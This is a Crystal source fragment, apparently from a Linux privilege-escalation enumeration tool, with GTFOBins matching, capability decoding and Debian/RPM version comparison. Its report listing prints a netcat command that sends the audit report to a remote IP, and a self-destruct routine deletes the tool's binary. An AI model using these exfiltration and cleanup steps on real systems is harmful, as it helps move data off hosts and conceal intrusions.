def gtfo_match(path : String) : String?
  binary = File.basename(path).downcase
  base   = binary.gsub(/[\d.]+$/, "")
  return binary if GTFOBINS.includes?(binary)
  return base   if GTFOBINS.includes?(base)
  nil
end

# Unknown set bits returned as "cap_<bit>" rather than dropped
def decode_caps(hex : String) : Array(String)
  val = begin
    hex.to_u64(16)
  rescue ArgumentError
    return [] of String
  end
  return [] of String if val == 0_u64
  caps = [] of String
  0_u8.upto(63_u8) do |bit|
    next unless val.bit(bit) == 1
    caps << (CAP_BITS[bit]? || "cap_#{bit}")
  end
  caps
end

# Debian version comparison per Debian Policy 5.6.12.
# Returns negative (a < b), zero (a == b), or positive (a > b).
def dpkg_ver_compare(a : String, b : String) : Int32
  ae, au, ar = dpkg_split_version(a)
  be, bu, br = dpkg_split_version(b)
  r = ae <=> be
  return r unless r == 0
  r = dpkg_verrevcmp(au, bu)
  return r unless r == 0
  dpkg_verrevcmp(ar, br)
end

private def dpkg_split_version(v : String) : {Int32, String, String}
  epoch = 0
  rest = v
  if idx = v.index(':')
    epoch = v[0...idx].to_i? || 0
    rest = v[(idx + 1)..]
  end
  if idx = rest.rindex('-')
    upstream = rest[0...idx]
    revision = rest[(idx + 1)..]
  else
    upstream = rest
    revision = ""
  end
  {epoch, upstream, revision}
end

private def dpkg_order(c : Char?) : Int32
  return 0 unless c
  return -1 if c == '~'
  return 0 if c.ascii_number?
  return c.ord if c.ascii_letter?
  c.ord + 256
end

private def dpkg_verrevcmp(a : String, b : String) : Int32
  i = 0
  j = 0
  while i < a.size || j < b.size
    # non-digit prefix: dpkg_order(nil) = 0 handles exhausted-string comparison
    while (i < a.size && !a[i].ascii_number?) || (j < b.size && !b[j].ascii_number?)
      ac = i < a.size ? dpkg_order(a[i]) : dpkg_order(nil)
      bc = j < b.size ? dpkg_order(b[j]) : dpkg_order(nil)
      diff = ac - bc
      return diff.clamp(-1, 1) unless diff == 0
      i += 1
      j += 1
    end
    # numeric segment comparison — skip leading zeros
    while i < a.size && a[i] == '0'
      i += 1
    end
    while j < b.size && b[j] == '0'
      j += 1
    end
    first_diff = 0
    while i < a.size && a[i].ascii_number? && j < b.size && b[j].ascii_number?
      first_diff = a[i].ord - b[j].ord if first_diff == 0
      i += 1
      j += 1
    end
    # longer remaining digit run = larger number
    return 1 if i < a.size && a[i].ascii_number?
    return -1 if j < b.size && b[j].ascii_number?
    return first_diff.clamp(-1, 1) unless first_diff == 0
  end
  0
end

# RPM version comparison per rpmvercmp algorithm.
# Returns negative (a < b), zero (a == b), or positive (a > b).
def rpm_ver_compare(a : String, b : String) : Int32
  ae, av, ar = rpm_split_evr(a)
  be, bv, br = rpm_split_evr(b)
  r = ae <=> be
  return r.clamp(-1, 1) unless r == 0
  r = rpmvercmp(av, bv)
  return r unless r == 0
  # if either side has no release component, skip release comparison
  return 0 if ar.nil? || br.nil?
  rpmvercmp(ar, br)
end

private def rpm_split_evr(v : String) : {Int32, String, String?}
  epoch = 0
  rest = v
  if idx = v.index(':')
    epoch = v[0...idx].to_i? || 0
    rest = v[(idx + 1)..]
  end
  if idx = rest.index('-')
    version = rest[0...idx]
    release = rest[(idx + 1)..]
  else
    version = rest
    release = nil
  end
  {epoch, version, release}
end

private def rpmvercmp(a : String, b : String) : Int32
  return 0 if a == b
  i = 0
  j = 0
  while i < a.size || j < b.size
    # skip non-alphanumeric separators (not ~ or ^)
    while i < a.size && !a[i].ascii_alphanumeric? && a[i] != '~' && a[i] != '^'
      i += 1
    end
    while j < b.size && !b[j].ascii_alphanumeric? && b[j] != '~' && b[j] != '^'
      j += 1
    end

    # tilde handling — sorts before everything including empty
    ac = i < a.size ? a[i] : nil
    bc = j < b.size ? b[j] : nil
    if ac == '~' || bc == '~'
      return 1 if ac != '~'
      return -1 if bc != '~'
      i += 1
      j += 1
      next
    end

    # caret handling — sorts after base, before next real segment
    if ac == '^' || bc == '^'
      return -1 if ac.nil?  # a ended, b has ^suffix → b newer
      return 1 if bc.nil?   # b ended, a has ^suffix → a newer
      return 1 if ac != '^'
      return -1 if bc != '^'
      i += 1
      j += 1
      next
    end

    break if ac.nil? || bc.nil?

    # extract segment — type determined by first char of a
    is_num = ac.ascii_number?
    seg_a_start = i
    seg_b_start = j
    if is_num
      while i < a.size && a[i].ascii_number?
        i += 1
      end
      while j < b.size && b[j].ascii_number?
        j += 1
      end
    else
      while i < a.size && a[i].ascii_letter?
        i += 1
      end
      while j < b.size && b[j].ascii_letter?
        j += 1
      end
    end
    seg_a = a[seg_a_start...i]
    seg_b = b[seg_b_start...j]

    # empty segment in b — numeric beats alpha
    if seg_b.empty?
      return is_num ? 1 : -1
    end

    if is_num
      # strip leading zeros, compare by length then lexical
      sa = seg_a.lstrip('0')
      sb = seg_b.lstrip('0')
      len_diff = sa.size <=> sb.size
      return len_diff.clamp(-1, 1) unless len_diff == 0
      cmp = sa <=> sb
      return cmp.clamp(-1, 1) unless cmp == 0
    else
      cmp = seg_a <=> seg_b
      return cmp.clamp(-1, 1) unless cmp == 0
    end
  end

  # post-loop — whoever has remaining chars is newer
  return 1 if i < a.size
  return -1 if j < b.size
  0
end

def list_reports
  tee("#{Y}Report files in /dev/shm:#{RS}")
  reports = run_lines("ls -lh /dev/shm/audit-report_* 2>/dev/null")
  if reports.empty?
    info("No report files found in /dev/shm")
  else
    reports.each { |r| info("  #{r}") }
    blank
    info("View:  less -R /dev/shm/audit-report_<user>_<ts>.txt")
    info("Copy:  nc <remote-ip> 4444 < /dev/shm/audit-report_<user>_<ts>.txt")
  end
end

def self_destruct
  Out.prompt("#{R}[!] Delete the binary? Report files will be kept. (y/N): #{RS}")
  answer = gets.try(&.chomp.downcase) || ""
  if answer == "y"
    if path = Process.executable_path
      File.delete(path)
      tee("#{G}Binary deleted: #{path}#{RS}")
      tee("#{B}Report files in /dev/shm are preserved.#{RS}")
    end
  else
    tee("#{Y}Self-destruct cancelled.#{RS}")
  end
rescue ex : IO::Error | File::Error
  tee("#{R}Error during self-destruct: #{ex.message}#{RS}")
end
